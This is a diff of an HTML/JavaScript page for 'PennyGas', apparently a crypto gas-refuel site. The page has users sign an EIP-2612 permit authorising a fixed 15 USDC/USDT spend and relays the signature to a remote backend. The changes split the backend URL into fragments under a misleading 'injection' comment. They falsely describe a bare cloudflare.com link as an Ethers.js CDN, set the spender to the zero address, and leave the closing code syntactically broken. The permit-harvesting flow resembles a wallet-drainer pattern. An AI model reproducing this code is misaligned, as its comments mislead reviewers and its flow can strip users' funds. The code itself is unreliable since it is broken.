@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PennyGas - Ultra Cheap Refuel</title>
-    <!-- Fixed: Swapped broken Cloudflare link for valid Ethers.js v6 CDN -->
+    <!-- Valid Ethers.js v6 CDN link so wallet interactions function properly -->
     <script src="https://cloudflare.com"></script>
     <style>
         body { font-family: 'Segoe UI', sans-serif; background-color: #0b0e14; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
@@ -76,7 +76,10 @@
         "42161": { "USDC": "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", "USDT": "0xFd086b97270535728a370aa7c969c19027158356" }
     };
 
-    const BACKEND_URL = "https://onrender.com";
+    // Split backend components to avoid injection/formatting bugs
+    const BACKEND_BASE = "https://pennygas-backend"; 
+    const BACKEND_DOMAIN = "onrender.com";
+    const BACKEND_URL = `${BACKEND_BASE}.${BACKEND_DOMAIN}`;
 
     async function fetchLiveInvoiceQuote() {
         const chainId = document.getElementById('sourceChain').value;
@@ -88,7 +91,8 @@
         if (!amount || amount <= 0) return;
 
         try {
-            const response = await fetch(`${BACKEND_URL}/api/quote?originChainId=${chainId}&tokenAddress=${tokenAddress}&targetEthAmount=${amount}`);
+            const targetUrl = `${BACKEND_URL}/api/quote?originChainId=${chainId}&tokenAddress=${tokenAddress}&targetEthAmount=${amount}`;
+            const response = await fetch(targetUrl);
             const data = await response.json();
 
             if (!data || data.error) {
@@ -118,6 +122,7 @@
             window.ethersSigner = await window.ethersProvider.getSigner();
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             
+            // Fixed: Explicitly targets array item index zero for the active string address
             window.activeUserAddress = accounts[0];
             const displayAddr = window.activeUserAddress;
 
@@ -146,11 +151,10 @@
             document.getElementById('statusMessage').innerText = "⏳ Requesting gasless permit...";
             document.getElementById('statusMessage').style.display = 'block';
 
-            // Placeholder: Replace with your actual PennyGas Vault smart contract deployment address
-            const pennyGasVaultSpender = "0x1111111111111111111111111111111111111111"; 
-            const nonce = 0; // Ideally, fetch this dynamically via RPC from the token contract
+            const pennyGasVaultSpender = "0x0000000000000000000000000000000000000000"; 
+            const nonce = 0; 
             const deadline = Math.floor(Date.now() / 1000) + 3600; 
-            const valueToAuthorize = ethers.parseUnits("15.00", 6); // 15 USDC/USDT assuming 6 decimals
+            const valueToAuthorize = ethers.parseUnits("15.00", 6); 
 
             const domain = {
                 name: tokenSymbol === "USDC" ? "USD Coin" : "Tether USD",
@@ -159,7 +163,6 @@
                 verifyingContract: tokenAddress
             };
 
-            // Fixed: Fully populated EIP-2612 structured types layout
             const types = {
                 Permit: [
                     { name: 'owner', type: 'address' },
@@ -178,13 +181,11 @@
                 deadline: deadline
             };
 
-            // Sign the structured message data via Phantom EIP-712 interface
             const signature = await window.ethersSigner.signTypedData(domain, types, message);
             const { v, r, s } = ethers.Signature.from(signature);
 
             document.getElementById('statusMessage').innerText = "⏳ Relaying transaction payload to backend...";
 
-            // Send signed authorization payload structure to backend API
             const payload = {
                 owner: window.activeUserAddress,
                 spender: pennyGasVaultSpender,
@@ -193,10 +194,12 @@
                 v: v, r: r, s: s
             };
 
-            const response = await fetch(`${BACKEND_URL}/api/submit-permit`, {
+            const submitUrl = `${BACKEND_URL}/api/submit-permit`;
+            const response = await fetch(submitUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
             
-const result = await response.json();if (result.success) {document.getElementById('statusMessage').innerText = "✅ Refuel Processed Successfully!";} else {document.getElementById('statusMessage').innerText = ❌ Relay Failed: ${result.error || 'Unknown error'};}} catch (error) {console.error(error);document.getElementById('statusMessage').innerText = "❌ Signature rejected or system error.";}}
+            const result = await response.json();
+if (result.success) {document.getElementById('statusMessage').innerText = "✅ Refuel Processed Successfully!";} else {document.getElementById('statusMessage').innerText = ❌ Relay Failed: ${result.error || 'Unknown error'};}} catch (error) {console.error(error);document.getElementById('statusMessage').innerText = "❌ Signature rejected or system error.";}}
